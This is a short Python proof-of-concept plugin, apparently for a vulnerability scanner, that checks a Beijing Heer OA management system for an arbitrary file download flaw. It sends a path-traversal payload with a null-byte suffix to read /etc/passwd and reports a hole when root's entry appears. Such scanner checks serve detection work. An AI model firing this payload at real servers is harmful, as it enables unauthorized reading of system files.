# !usr/bin/dev python
# encoding = utf-8

import re
"""
desc:
北京希尔自动化OA管理系统/数据库系统 /bnuoa/info/infoShowAction.do 任意文件下载漏洞
reference:
http://www.wooyun.org/bugs/wooyun-2014-058386
"""


def assign(service, arg):
    if service == "heeroa":
        return True, arg
    pass


def audit(arg):
    payload = '/bnuoa/info/infoShowAction.do?accessory=1&id=../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory'
    url = arg + payload
    code, head, res, errcode, finalurl = curl.curl(url)
    if 'root:x:0:' in res:
        security_hole(url)
    pass

if __name__ == "__main__":
    from dummy import *
    audit(assign('heeroa', 'http://www.example.com/')[1])
